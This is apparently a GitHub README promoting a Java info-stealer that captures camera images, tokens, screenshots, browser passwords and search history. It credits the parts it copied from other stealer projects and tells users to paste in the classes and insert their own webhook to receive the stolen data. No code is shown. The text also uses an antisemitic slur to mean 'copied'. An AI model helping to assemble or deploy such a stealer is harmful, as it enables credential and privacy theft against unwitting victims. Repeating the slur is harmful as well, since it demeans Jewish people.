# Java-Info-Logger


This is a project i made by myself, its a java "basic" logger i made with some friends help


## What does it grabs?


* Camera
* Tokens
* Future stuff
* ScreenShot
* Sometimes it grabs browser passwords
* Google search history


## Is it totally custom? 


No, there are some things i cant do by myself, the tokenlogger was jew from travis rat, the password grabber was jew from https://github.com/tresacton/PasswordStealer/


## How does it works?

Well, u have to add some libraries u can check here ---> https://github.com/Simple-Github-ORG/Java-Info-Logger/blob/main/Logger.iml <---, add em to ur build.gradle, assuming ur not a script kiddie u should be able to paste the classes inside the repo and place ur webhook where there is mine webhook, if u cant do that u shouldnt try to skid this ☠️☠️☠️
